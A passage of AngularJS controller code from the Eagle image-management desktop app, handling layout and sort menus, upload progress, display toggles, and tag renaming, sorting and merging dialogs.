        $scope.switchTagLayout = function (mode) {
            $scope.tagViewLayoutMode = mode;
            localStorage.setItem("TAGVIEW_LAYOUT", mode);
            $scope.TagManager.renderTagsResult();
        };

        $scope.toggleTagLayout = function () {
        	if ($scope.tagViewLayoutMode === "INLINE") {
        		$scope.switchTagLayout("LIST");
        	}
        	else {
        		$scope.switchTagLayout("INLINE");
        	}
        };

        $scope.openSidebarMenu = (event) => {

            event && event.stopPropagation();

            ContextMenu.open({
                items: [
                    {
                        label: i18n.__("context.order.toggle>all"),
                        accelerator: 'Tab',
                        keepOpen: true,
                        click: () => {
                            $scope.toggleAll();
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("context.order.toggle>sidebar"),
                        // checked: !$scope.isHideSidebar,
                        accelerator: 'CmdOrCtrl+alt+1',
                        keepOpen: true,
                        click: () => {
                            $scope.toggleSidebar();
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("context.order.toggle>inspector"),
                        accelerator: 'CmdOrCtrl+alt+2',
                        keepOpen: true,
                        click: () => {
                            eagle.inspector.toggle();
                            $scope.$evalAsync();
                        }
                    }
                ],
                showSearch: false,
            })
        };

        function updateCurrentOrderAndIncrease () {
        	var orderBy;
            var sortIncrease;
            if ($scope.currentFolder) {
                orderBy = $scope.currentFolder.orderBy;
                if ($scope.currentFolder.orderBy) {
                    sortIncrease = $scope.currentFolder.sortIncrease;
                }
                else {
                    sortIncrease = $scope.sortIncrease;
                }
            }
            else if ($scope.currentSmartFolder) {
                if ($scope.currentSmartFolder.orderBy) {
                    sortIncrease = $scope.currentSmartFolder.sortIncrease;
                }
                else {
                    sortIncrease = $scope.sortIncrease;
                }
                orderBy = $scope.currentSmartFolder.orderBy;
            }
            else {
                orderBy = $scope.orderBy;
                sortIncrease = $scope.sortIncrease;
            }
            $scope.currentOrderBy = orderBy;
            $scope.currentSortIncrease = sortIncrease;
        }

        // 列表模式欄位顯示/隱藏
        $scope.openListPropContextMenu = (event) => {

            event.stopPropagation();
            
            const toggleListLayoutProp = (key, value) => {
                $scope.listLayoutSettings.props[key] = value;
                $scope.$evalAsync();
                localStorage["eagle.list.layout.settings"] = JSON.stringify($scope.listLayoutSettings);
            };
            
            ContextMenu.open({
                items: [{
                    checked: $scope.listLayoutSettings.props.tags,
                    label: i18n.__("context.order.metaItems>tags"), 
                    icon: 'ic-order-by-tag.svg',
                    click: () => {
                        toggleListLayoutProp("tags", !$scope.listLayoutSettings.props.tags);
                    },
                    keepOpen: true
                },
                {
                    checked: $scope.listLayoutSettings.props.resolution,
                    label: i18n.__("context.order.orderBy>resolution"), 
                    icon: 'ic-order-by-resolution.svg',
                    click: () => {
                        toggleListLayoutProp("resolution", !$scope.listLayoutSettings.props.resolution);
                    },
                    keepOpen: true
                },
                {
                    checked: $scope.listLayoutSettings.props.rating,
                    label: i18n.__("context.order.orderBy>rating"), 
                    icon: 'ic-order-by-rating.svg',
                    click: () => {
                        toggleListLayoutProp("rating", !$scope.listLayoutSettings.props.rating);
                    },
                    keepOpen: true
                },
                {
                    checked: $scope.listLayoutSettings.props.extension,
                    label: i18n.__("context.order.displayItems>ext"), 
                    icon: 'ic-order-by-ext.svg',
                    click: () => {
                        toggleListLayoutProp("extension", !$scope.listLayoutSettings.props.extension);
                    },
                    keepOpen: true
                },
                {
                    checked: $scope.listLayoutSettings.props.fileSize,
                    label: i18n.__("context.order.orderBy>filesize"), 
                    icon: 'ic-order-by-filesize.svg',
                    click: () => {
                        toggleListLayoutProp("fileSize", !$scope.listLayoutSettings.props.fileSize);
                    },
                    keepOpen: true
                },
                {
                    checked: $scope.listLayoutSettings.props.dateImported,
                    label: i18n.__("context.order.orderBy>import"), 
                    icon: 'ic-order-by-import.svg',
                    click: () => {
                        toggleListLayoutProp("dateImported", !$scope.listLayoutSettings.props.dateImported);
                    },
                    keepOpen: true
                }],
                showSearch: false,
            });
        }

        $scope.openFileListContextMenu = (event) => {

            event.stopPropagation();

            const items = [
                {
                    keywords: `${i18n.__("context.order.toggle>sidebar")} sidebar left`,
                    label: i18n.__("context.order.toggle>sidebar"),
                    icon: 'ic-sidebar.svg',
                    accelerator: 'CmdOrCtrl+alt+1',
                    checked: !$scope.isHideSidebar,
                    keepOpen: true,
                    click: () => {
                        $scope.toggleSidebar();
                        $scope.$evalAsync();
                    }
                },
                {
                    keywords: `${i18n.__("context.order.toggle>inspector")} inspector right`,
                    label: i18n.__("context.order.toggle>inspector"),
                    icon: 'ic-inspector.svg',
                    accelerator: 'CmdOrCtrl+alt+2',
                    checked: !eagle.inspector.isHideInspector,
                    keepOpen: true,
                    click: () => {
                        eagle.inspector.toggle();
                        $scope.$evalAsync();
                    }
                },
                {
                    role: 'separator',
                },
                {
                    keywords: 'pinterest 瀑布流',
                    label: i18n.__("context.order.layout>grid"),
                    icon: 'ic-layout-pinterest.svg',
                    accelerator: 'Alt+1',
                    click: () => {
                        $scope.switchGridLayout();
                        $scope.$evalAsync();
                    },
                    keepOpen: true
                },
                {
                    keywords: '自适应 justified',
                    label: i18n.__("context.order.layout>justified"),
                    icon: 'ic-layout-justified.svg',
                    accelerator: 'Alt+2',
                    click: () => {
                        $scope.switchJustifiedLayout();
                        $scope.$evalAsync();
                    },
                    keepOpen: true
                },
                {
                    keywords: '正方 square grid 格',
                    label: i18n.__("context.order.layout>square"),
                    icon: 'ic-layout-grid.svg',
                    accelerator: 'Alt+3',
                    click: () => {
                        $scope.switchSquareLayout();
                        $scope.$evalAsync();
                    },
                    keepOpen: true
                },
                {
                    keywords: `list 列表`,
                    label: i18n.__("context.order.layout>list"),
                    icon: 'ic-layout-list.svg',
                    accelerator: 'Alt+4',
                    click: () => {
                        $scope.switchListLayout();
                        $scope.$evalAsync();
                    },
                    keepOpen: true
                },
                {
                    role: 'separator',
                },
                {
                    keywords: `refresh reload`,
                    label: i18n.__("context.order.refresh"),
                    icon: 'ic-refresh.svg',
                    click: () => {
                        $scope.reload();
                        $scope.$evalAsync();
                    }
                },
                {
                    label: i18n.__("general.newFile"),
                    icon: 'ic-add.svg',
                    submenu: {
                        items:
                            [
                                // 設計文件
                                {
                                    visible: process.platform == 'darwin' && installedApplications["sketch"].isInstalled,
                                    label: "Sketch " + i18n.__("general.document"),
                                    keywords: 'template 模板 file',
                                    icon: '/templates/ic-sketch.png',
                                    click: function() { $scope.newFileFromTemplate("sketch"); $scope.$evalAsync(); }
                                },
                                {
                                    label: "Photoshop " + i18n.__("general.document"),
                                    icon: '/templates/ic-photoshop.png',
                                    keywords: 'template 模板 file adobe psd photoshop',
                                    click: function() { $scope.newFileFromTemplate("psd"); $scope.$evalAsync(); }
                                },
                                {
                                    label: "Illustrator " + i18n.__("general.document"),
                                    icon: '/templates/ic-illustration.png',
                                    keywords: 'template 模板 file adobe ai illustrator',
                                    click: function() { $scope.newFileFromTemplate("ai"); $scope.$evalAsync(); }
                                },
                                {
                                    label: "XD " + i18n.__("general.document"),
                                    icon: '/templates/ic-xd.png',
                                    keywords: 'template 模板 file adobe xd',
                                    click: function() { $scope.newFileFromTemplate("xd"); $scope.$evalAsync(); }
                                },
                                {
                                    role: 'separator'
                                },
                                // 其它文件
                                {
                                    accelerator: 'Alt+Shift+N',
                                    label: i18n.__("general.txtDocument"),
                                    icon: '/templates/ic-txt.png',
                                    keywords: 'template 模板 file note txt text',
                                    click: function() { $scope.newFileFromTemplate("txt"); $scope.$evalAsync(); }
                                },
                                {
                                    label: "Word " + i18n.__("general.document"),
                                    icon: '/templates/ic-word.png',
                                    keywords: 'template 模板 file office microsoft doc docx word',
                                    click: function() { $scope.newFileFromTemplate("docx"); $scope.$evalAsync(); }
                                },
                                {
                                    label: "PowerPoint " + i18n.__("general.document"),
                                    icon: '/templates/ic-powerpoint.png',
                                    keywords: 'template 模板 file office microsoft ppt pptx powerpoint',
                                    click: function() { $scope.newFileFromTemplate("pptx"); $scope.$evalAsync(); }
                                },
                                {
                                    label: "Excel " + i18n.__("general.document"),
                                    icon: '/templates/ic-excel.png',
                                    keywords: 'template 模板 file office microsoft xls xlsx csv excel',
                                    click: function() { $scope.newFileFromTemplate("xlsx"); $scope.$evalAsync(); }
                                },
                                {
                                    visible: process.platform == 'darwin',
                                    label: "Keynote " + i18n.__("general.document"),
                                    icon: '/templates/ic-keynote.png',
                                    keywords: 'template 模板 file apple office',
                                    click: function() { $scope.newFileFromTemplate("key"); $scope.$evalAsync(); }
                                },
                                {
                                    visible: process.platform == 'darwin',
                                    label: "Pages " + i18n.__("general.document"),
                                    icon: '/templates/ic-pages.png',
                                    keywords: 'template 模板 file apple office',
                                    click: function() { $scope.newFileFromTemplate("pages"); $scope.$evalAsync(); }
                                },
                                {
                                    visible: process.platform == 'darwin',
                                    label: "Numbers " + i18n.__("general.document"),
                                    icon: '/templates/ic-numbers.png',
                                    keywords: 'template 模板 file apple office',
                                    click: function() { $scope.newFileFromTemplate("numbers"); $scope.$evalAsync(); }
                                },
                                {
                                    visible: process.platform == 'darwin' && installedApplications["mindnode"].isInstalled,
                                    label: "MindNode " + i18n.__("general.document"),
                                    icon: '/templates/ic-mindnode.png',
                                    keywords: 'template 模板 file mind 脑图 心智图',
                                    click: function() { $scope.newFileFromTemplate("mindnode"); $scope.$evalAsync(); }
                                },
                                {
                                    visible: (process.platform == 'darwin')? installedApplications["xmind"].isInstalled : true,
                                    label: "XMind " + i18n.__("general.document"),
                                    icon: '/templates/ic-xmind.png',
                                    keywords: 'template 模板 file mind 脑图 心智图',
                                    click: function() { $scope.newFileFromTemplate("xmind"); $scope.$evalAsync(); }
                                },
                        ]
                    }
                },
                {
                    role: 'separator',
                },
                {
                    keywords: `more`,
                    label: i18n.__("Context.Image.Other"),
                    icon: 'ic-more-actions.svg',
                    click: (event) => {
                        $scope.openOrderMenu();
                    }
                }
            ];

            ContextMenu.open({
                items: items,
                showSearch: true,
            });
        };

        $scope.openOrderMenu = function (event) {
			event && event.stopPropagation();
            $rootScope.$broadcast("OPEN_LAYOUT_PANEL");
            updateCurrentOrderAndIncrease();
        }

        $scope.changeListOrderBy = function (orderBy) {
            if (orderBy === $scope.currentOrderBy) {
                $scope.changeSortIncrease(!$scope.currentSortIncrease);
            }
            else {
                $scope.changeSortIncrease(true);
                $scope.changeOrderBy(orderBy);
            }
        };

        $scope.changeOrderBy = function (orderBy) {
            if ($scope.currentFolder) {
                $scope.setFolderOrder($scope.currentFolder, orderBy);
                try { electronLog && electronLog.info(`[app] Change folder order to “${$scope.currentFolder.name}(${$scope.currentFolder.id})” order by: ${orderBy}`); } catch (err) {};
            }
            else if ($scope.currentSmartFolder) {
                $scope.setSmartFolderOrder($scope.currentSmartFolder, orderBy);
                try { electronLog && electronLog.info(`[app] Change smart-folder order to “${$scope.currentSmartFolder.name}(${$scope.currentSmartFolder.id})” order by: ${orderBy}`); } catch (err) {};
            }
            else {
                if (orderBy) {
                    $scope.orderBy = orderBy;
                    $scope.orderByName = i18n.__(`context.order.orderBy>${$scope.orderBy.toLowerCase()}`);
                    localStorage.setItem(`eagle.list.orderBy.${$scope.rootDir}`, $scope.orderBy);
                    $scope.sortRawData($scope.orderBy);
                    $scope.rebindRefresh();
                    $scope.$evalAsync();
                    try { electronLog && electronLog.info(`[app] Change global list order to: ${orderBy}`); } catch (err) {};
                }
            }
            updateCurrentOrderAndIncrease();
        };

        $scope.changeSortIncrease = function (sortIncrease) {
            if ($scope.currentFolder && $scope.currentFolder.orderBy) {
                $scope.setFolderSortIncrease($scope.currentFolder, sortIncrease);
            }
            else if ($scope.currentSmartFolder && $scope.currentSmartFolder.orderBy) {
                $scope.setSmartFolderSortIncrease($scope.currentSmartFolder, sortIncrease);
            }
            else {
                if (sortIncrease !== undefined) {
                    $scope.sortIncrease = sortIncrease;
                    localStorage.setItem("eagle.list.sortIncrease", sortIncrease);
                    localStorage.setItem(`eagle.list.sortIncrease.${$scope.rootDir}`, sortIncrease);
                    $scope.rebindRefresh();
                    $scope.$evalAsync();
                }
            }
            updateCurrentOrderAndIncrease();
        };

        var addImageTimeLeftInterval;
        $scope.showUploadQueue = function() {
            if (!$scope.addImageStartTime) {
                $scope.addImageStartTime = Date.now();
            }
            $("body").addClass("is-uploading");
            $("#upload-queue-progress").addClass("open");
            $("#upload-queue-progress .progressbar").removeClass("ng-hide");
            $("#upload-queue-progress").find(".message .percentage").html($scope.finishQueue.length + "/" + $scope.uploadQueue.length);
            addImageTimeLeftInterval = setInterval(function () {
                calcuteAddImageTimeLeft();
                $scope.$evalAsync();
            }, 1000);
        };

        // 計算剩餘時間
        function calcuteAddImageTimeLeft () {
            if ($scope.uploadQueue.length > 0) {
                if (!$scope.addImageStartTime) {
                    $scope.addImageStartTime = Date.now();
                }
                var elapsedTime = (new Date().getTime()) - $scope.addImageStartTime;
                var chunksPerTime = $scope.finishQueue.length / elapsedTime;
                var estimatedTotalTime = $scope.uploadQueue.length / chunksPerTime;
                var remain = parseInt((estimatedTotalTime - elapsedTime) / 1000);
                if (is.number(remain)) {
                    $scope.addImageTimeLeftInSeconds = remain;
                }
            }
        };

        $scope.hideUploadQueue = function() {
            if ($scope.uploadQueue.length === 0) {
                $("#upload-queue-progress").removeClass("open");
                $("body").removeClass("is-uploading");
                updateWindowProgressBar(-1);
            }
        };

        $scope.showListSubfolderContent = function() {
            $scope.showSubfolderContent = !$scope.showSubfolderContent;
            preferences.showSubfolderContent = $scope.showSubfolderContent;
            electronSettings.set('preferences', preferences).then(function() {});
            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                $scope.rebindRefresh();
                $scope.updateSelection();
                $("#box-container-scrollbar").trigger("UPDATE_BOX_SCROLLBAR");
            });

            $scope.$evalAsync();
            if ($scope.showSubfolderContent) { electronLog && electronLog.info("[app] Show sub-folder on list: ON"); }
            else { electronLog && electronLog.info("[app] Show sub-folder on list: OFF"); }
        };

        $scope.showListName = function() {
            $scope.showName = !$scope.showName;
            localStorage.setItem("eagle.list.show.name", $scope.showName);
            $("#box-container").toggleClass("hide-box-name");
            $scope.adjustLayoutWidth(0);
            $scope.offsetScrollbar(30);
            if ($scope.showName) { electronLog && electronLog.info("[app] Show item name on list: ON"); }
            else { electronLog && electronLog.info("[app] Show item name on list: OFF"); }
        };

        $scope.showListMetas = function() {
            $scope.showMetas = !$scope.showMetas;
            localStorage.setItem("eagle.list.show.meta", $scope.showMetas);
            $("#box-container").toggleClass("hide-box-metas");
            $scope.adjustLayoutWidth(0);
            $scope.offsetScrollbar(30);
            if ($scope.showMetas) { electronLog && electronLog.info("[app] Show item meta on list: ON"); }
            else { electronLog && electronLog.info("[app] Show item meta on list: OFF"); }
        };

        $scope.showListAnnotation = function() {
            $scope.showAnnotation = !$scope.showAnnotation;
            localStorage.setItem("eagle.list.show.annotation", $scope.showAnnotation);
            $("#box-container").toggleClass("hide-box-annotation");
            $scope.relayout();
            if ($scope.showAnnotation) { electronLog && electronLog.info("[app] Show item annotation count on list: ON"); }
            else { electronLog && electronLog.info("[app] Show item annotation count on list: OFF"); }
        };

        $scope.showListExtension = function() {
            $scope.showFileExtension = !$scope.showFileExtension;
            localStorage.setItem("eagle.list.show.extension", $scope.showFileExtension);
            $("#box-container").toggleClass("hide-box-extension");
            if ($scope.showFileExtension) { electronLog && electronLog.info("[app] Show item file extension on list: ON"); }
            else { electronLog && electronLog.info("[app] Show item file extension on list: OFF"); }
        };

        $scope.showListExtensionLabel = function() {
            $scope.showFileExtensionLabel = !$scope.showFileExtensionLabel;
            localStorage.setItem("eagle.list.show.extension_LABEL", $scope.showFileExtensionLabel);
            $("#box-container").toggleClass("hide-box-extension-label");
            if ($scope.showFileExtensionLabel) { electronLog && electronLog.info("[app] Show item file extension label on list: ON"); }
            else { electronLog && electronLog.info("[app] Show item file extension label on list: OFF"); }
        };

        $scope.openTagGroupListContextMenu = (event) => {
            ContextMenu.open({
                items: [
                    {
                        checked: TagManager.sortBy === 'name' && TagManager.sortIncrease === 'true',
                        label: "A > Z",
                        click: () => { TagManager.changeSort("name", 'true'); $scope.$evalAsync();},
                    },
                    {
                        checked: TagManager.sortBy === 'name' && TagManager.sortIncrease === 'false',
                        label: "Z > A",
                        click: () => { TagManager.changeSort("name", 'false'); $scope.$evalAsync();},
                    },
                    {
                        checked: TagManager.sortBy === 'imageCount' && TagManager.sortIncrease === 'true',
                        label: i18n.__("context.tagList.sortByCount") + i18n.__("context.order.high-low"),
                        click: () => { TagManager.changeSort("imageCount", 'true'); $scope.$evalAsync();},
                    },
                    {
                        checked: TagManager.sortBy === 'imageCount' && TagManager.sortIncrease === 'false',
                        label: i18n.__("context.tagList.sortByCount") + i18n.__("context.order.low-high"),
                        click: () => { TagManager.changeSort("imageCount", 'false'); $scope.$evalAsync();},
                    },
                    { 
                        visible: !$scope.currentTagGroup,
                        role: 'separator' },
                    {
                        visible: !$scope.currentTagGroup,
                        label: i18n.__("context.tagList.groupBy"),
                        submenu: {
                            items:
                            [
                                {
                    
                                    checked: TagManager.groupBy === "alphabet",
                                    label: i18n.__("context.tagList.alphabet"),
                                    click() {
                                        TagManager.changeGroupBy("alphabet");
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                    
                                    checked: TagManager.groupBy === "group",
                                    label: i18n.__("context.tagList.tagGroup"),
                                    click() {
                                        TagManager.changeGroupBy("group");
                                        $scope.$evalAsync();
                                    }
                                }
                            ],
                        }
                    }
                ]
            });
        };

        $scope.reorderTagsByTitle = function(tags, callback) {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__("dialog.sortTags.title")}</h4>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__('dialog.sortTags.button'),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function () {
                tags = tags.sort(function(a, b) {
                    return a.toUpperCase().localeCompare(b.toUpperCase(), languageBCP, {numeric: true});
                });
                callback && callback();
                try { electronLog && electronLog.info(`[app] Sort tags by tab name`); } catch (err) {};
            });
        };

        $scope.reorderTagsByCount = function(tags, callback) {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__("dialog.sortTagsByCount.title")}</h4>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__('dialog.sortTags.button'),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function () {
                tags = tags.sort(function(a, b) {
                    var taga = TagManager.tagMappings[a];
                    var tagb = TagManager.tagMappings[b];
                    if (!taga || !tagb) return 0;
                    var countA = taga.imageCount;
                    var countB = tagb.imageCount;
                    return countB - countA;
                });
                callback && callback();
                try { electronLog && electronLog.info(`[app] Sort tags by tag count`); } catch (err) {};
            });
        };

        $scope.editTag = function (tag) {
            swal({
                title: i18n.__("Context.Tag.Edit.Title"),
                html: i18n.__("Context.Tag.Edit.Descript"),
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                onOpen: function () {
                    setTimeout(function () {
                        var input = swal.getInput();
                        if (input) {
                            $(input).select().focus();
                        }
                    }, 100);
                },
                width: 400,
                input: 'text',
                inputPlaceholder: i18n.__('Context.Tag.Edit.Placeholder'),
                inputValue: tag.name,
                inputValidator: function (value) {
                    return new Promise(function (resolve, reject) {
                        // if (value && !/[$%^*<>'"\\|?*]+/.test(value)) {
                           resolve()
                        // } else {
                            // reject(i18n.__('Dialog.CreateLibrary.Error'))
                        // }
                    })
                },
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("Context.Tag.Edit.Title"),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function (newName) {

                if (newName === tag.name) return;
                
                electronLog && electronLog.info(`[app] Rename tag: [${tag.name}] > [${newName}]`);
                analytics.event('Tag', 'Rename', newName);

                var originTag = angular.copy(tag);

                // 更新所有出现该标签的图片
                var originImages = [];
                var originImagesTags = [];
                var changed = [];

                // $scope.raw.forEach(function(image) {
                for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                    var image = $scope.raw[rindex];
                    if (image && image.tags) {
                        var idx = image.tags.indexOf(tag.name);
                        if (idx !== -1 && newName) {
                            originImages.push(image);
                            originImagesTags.push(angular.copy(image.tags));
                            image.tags[idx] = newName;
                            image.tags = [...new Set(image.tags)];
                            changed.push(image);
                        }
                    }
                }
                ayncsImagesChange(changed);
                hiddenByCurrentFilter(changed);

                // 修改标签群组包含的标签
                var originGroups = [];
                var originGroupsTags = [];
                if (TagManager.groups.length > 0) {
                    TagManager.groups.forEach(function (group) {
                        originGroups.push(group);
                        originGroupsTags.push(angular.copy(group.tags));
                        if (group.tags) {
                            var idx = group.tags.indexOf(tag.name);
                            if (idx !== -1 && newName) {
                                var nidx = group.tags.indexOf(newName);
                                if (nidx === -1) {
                                    group.tags[idx] = newName;
                                    group.tags = [...new Set(group.tags)];
                                }
                                else {
                                    group.tags.splice(idx, 1);
                                }
                            }
                        }
                    });
                }

                var originHistoryTags = angular.copy(originHistoryTags);
                try {
                    if (TagManager.historyTags && TagManager.historyTags.length > 0) {
                        var idx = TagManager.historyTags.indexOf(tag.name);
                        if (idx !== -1 && newName) {
                            var nidx = TagManager.historyTags.indexOf(newName);
                            if (nidx === -1) {
                                TagManager.historyTags[idx] = newName;
                                TagManager.historyTags = [...new Set(TagManager.historyTags)];
                            }
                            else {
                                TagManager.historyTags.splice(idx, 1);
                            }
                            TagManager.save();
                        }
                    }
                } catch (err) {
                    electronLog && electronLog.error(err.stack || err);
                }

                // 更新所有文件夹智能标签
                var originFolders = [];
                var originFoldersTags = [];
                eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {
                    if (folder && folder.tags) {
                        var idx = folder.tags.indexOf(tag.name);
                        if (idx !== -1 && newName) {
                            originFolders.push(folder);
                            originFoldersTags.push(angular.copy(folder.tags));
                            folder.tags[idx] = newName;
                            folder.tags = [...new Set(folder.tags)];
                        }
                    }
                });

                // 更新智能文件夹的标签属性
                var originConditions = [];
                var originSmartFolders = [];
                eagle.utils.tree.walk($scope.smartFolders, 'children', function (smartFolder, parent, depth) {
                	if (!smartFolder.conditions) return;
                    originSmartFolders.push(smartFolder);
                    originConditions.push(angular.copy(smartFolder.conditions));

                    smartFolder.conditions.forEach(function (condition) {
                        if (!condition.rules) return;
                        condition.rules.forEach(function (rule) {
                            if (rule && rule.property === 'tags') {
                                var ruleTags = rule.value;
                                if (ruleTags && ruleTags.length > 0) {
                                    var idx = ruleTags.indexOf(tag.name);
                                    if (idx !== -1 && newName) {
                                        rule.value[idx] = newName;
                                        rule.value = [...new Set(rule.value)];
                                    }
                                }
                            }
                        });
                    });
                });
                
                $scope.tagsSuggestion.push({
                    value: newName,
                    text: newName
                });
                
                $scope.saveFolder();

                tag.name = newName;
                tag.pinyin = tinyPinyin.convertToPinyin(tag.name);
                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                    $scope.rebindRefresh();
                    $scope.updateSelection();
                });

                var message = $filter('i18n')("notify.tag.nameChange", [
                    { "property": "origin", "value": originTag.name },
                    { "property": "new", "value": tag.name }
                ]);
                // 復原
                $rootScope.notify({
                    message: message,
                    duration: 2000,
                });

            }, function() {});
        };

        $scope.openTagContextMenu = function openTagContextMenu (event, tag, group) {
            event.stopPropagation();
            if (!tag) return;

            let currentTagGroup = $scope.currentTagGroup || group;
            let containsGroupMappings = {};
            let isStarred = TagManager.isInStarred(tag.name);

            if (tag.groups && tag.groups.length > 0) {
                
                tag.groups.forEach((groupID) => {
                    containsGroupMappings[groupID] = true;
                });
                
                if (!currentTagGroup) {
                    if (TagManager.groupMappings[tag.groups[0]]) {
                        currentTagGroup = TagManager.groupMappings[tag.groups[0]];
                    }
                } 
            }

            if (!$scope.selectedTags[tag.name]) {
                $scope.selectedTags = {};
            }
            $scope.selectedTags[tag.name] = true;


            let selectedTags = $scope.tags.filter((tag) => {
                return !!$scope.selectedTags[tag.name];
            });

            let tags = Object.keys($scope.selectedTags).map(function(key) {
                return key;
            });

            let addToGroupsMenu = { items: [] };
            let moveToGroupsMenu = { items: [] };

            TagManager.groups.forEach((group) => {
                addToGroupsMenu.items.push({
                    disabled: containsGroupMappings[group.id],
                    checked: containsGroupMappings[group.id],
                    label: group.name,
                    keywords: `${i18n.__("Context.Tag.AddToGroups")} add 添加 group 群組`,
                    icon: `ic-tag-${group.color}.svg`,
                    click: () => {
                        TagManager.addTagsToGroup(group.id, tags, true);
                        $scope.$evalAsync();
                    }
                });
                moveToGroupsMenu.items.push({
                    label: group.name,
                    keywords: `${i18n.__("Context.Tag.MoveToGroups")} move 移動 group 群組`,
                    icon: `ic-tag-${group.color}.svg`,
                    click: () => {
                        TagManager.moveTagsToGroup(group.id, tags);
                        $scope.$evalAsync();
                    }
                });
            })

            ContextMenu.open({
                items: [
                    // 搜索包含群组标签的项目
                    {
                        label: i18n.__("Context.Tag.FilterWithTags"),
                        keywords: 'filter 篩選 search find tags',
                        icon: 'ic-tag-filter.svg',
                        click: () => {
                            TagManager.filterWithTags(tags);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        role: 'separator'
                    },
                    // 设为常用标签
                    {
                        disabled: isStarred,
                        label: i18n.__("Context.Tag.Starred"),
                        keywords: 'star favorite 常用 like',
                        icon: 'ic-tag-star.svg',
                        click: () => {
                            TagManager.addStarredTags(tags);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        disabled: !isStarred,
                        label: i18n.__("Context.Tag.UnStarred"),
                        keywords: 'unstar favorite 常用 unlike',
                        icon: 'ic-tag-unstar.svg',
                        click: () => {
                            TagManager.removeStarredTags(tags);
                            $scope.$evalAsync();
                        }
                    },
                    // 重命名標籤
                    {
                        visible: selectedTags.length === 1,
                        label: i18n.__("Context.Tag.Edit.Title"),
                        keywords: '重命名 rename edit 修改',
                        icon: 'ic-tag-rename.svg',
                        click: () => {
                            $scope.$evalAsync(() => {
                                $scope.editTag(tag);
                            });
                        }
                    },
                    {
                        visible: selectedTags.length > 1,
                        label: i18n.__('context.image.batchRename.msg1') + selectedTags.length + i18n.__('context.image.batchRename.msg2'),
                        keywords: '重命名 rename edit 修改',
                        icon: 'ic-tag-move.svg',
                        click: () => {
                            $scope.$evalAsync(() => {
                                $rootScope.$broadcast("OPEN_RENAME", {
                                    type: "TAGS",
                                    tags: selectedTags.slice()
                                });
                            });
                        }
                    },
                    {
                        role: 'separator'
                    },
                    // 添加、移動、移除群組
                    {
                        label: i18n.__("Context.Tag.AddToGroups"),
                        icon: 'ic-tag-add.svg',
                        submenu: addToGroupsMenu
                    },
                    {
                        label: i18n.__("Context.Tag.MoveToGroups"),
                        icon: 'ic-tag-move.svg',
                        submenu: moveToGroupsMenu
                    },
                    {
                        disabled: !currentTagGroup,
                        label: i18n.__("Context.Tag.RemoveFromGroups"),
                        keywords: 'remove 移除 group delete 刪除',
                        icon: 'ic-tag-remove-group.svg',
                        click: () => {
                            let tags = Object.keys($scope.selectedTags).map((key) => {
                                return key;
                            });
                            TagManager.removeTagsFromGroup(currentTagGroup.id, tags);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        role: 'separator'
                    },
                    {
                        visible: selectedTags.length > 1,
                        disabled: !(selectedTags.length > 1 && selectedTags.length <= 5),
                        label: i18n.__("Context.Tag.Merge1") + selectedTags.length + i18n.__("Context.Tag.Merge2"),
                        keywords: 'merge 合併 combine',
                        icon: 'ic-tag-merge.svg',
                        click: function() {
                            swal({
                                title: i18n.__("Dialog.MergeTags.Title1") + selectedTags.length + i18n.__("Dialog.MergeTags.Title2"),
                                html: i18n.__("Dialog.MergeTags.Descript"),
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                width: 400,
                                onOpen: function () {
                                    setTimeout(function () {
                                        let input = swal.getInput();
                                        if (input) {
                                            $(input).select().focus();
                                        }
                                    }, 100);
                                },
                                input: 'text',
                                inputPlaceholder: i18n.__('Dialog.MergeTags.Placeholder'),
                                inputValue: tag.name,
                                inputValidator: function (value) {
                                    return new Promise(function (resolve, reject) {
                                        // if (value && !/[$%^*<>'"\\|?*]+/.test(value)) {
                                            resolve()
                                        // } else {
                                            // reject(i18n.__('Dialog.MergeTags.Error'))
                                        // }
                                    })
                                },
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__("Dialog.MergeTags.Button"),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(function (newName) {
                                
                                let tagNames = selectedTags.map(function (tag) { return tag.name; });
                                if (tagNames) {
                                    electronLog && electronLog.info(`[app] Merge tag: [${tagNames.join(", ")}] > [${newName}]`);
                                }
                
                                // 更新所有出现该标签的图片
                                let changed = [];
                
                                selectedTags.forEach(function (tag) {
                
                                    if (newName === tag.name) return;
                
                                    let originTag = angular.copy(tag);
                
                                    for (let rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                                        let image = $scope.raw[rindex];
                                        let idx = image.tags.indexOf(tag.name);
                                        if (idx !== -1 && newName) {
                                            image.tags[idx] = newName;
                                            image.tags = [...new Set(image.tags)];
                                            changed.push(image);
                                        }
                                    }
                
                                    // 修改标签群组包含的标签
                                    if (TagManager.groups.length > 0) {
                                        TagManager.groups.forEach(function (group) {
                                            let idx = group.tags.indexOf(tag.name);
                                            if (idx !== -1 && newName) {
                                                let nidx = group.tags.indexOf(newName);
                                                if (nidx === -1) {
                                                    group.tags[idx] = newName;
                                                    group.tags = [...new Set(group.tags)];
                                                }
                                                else {
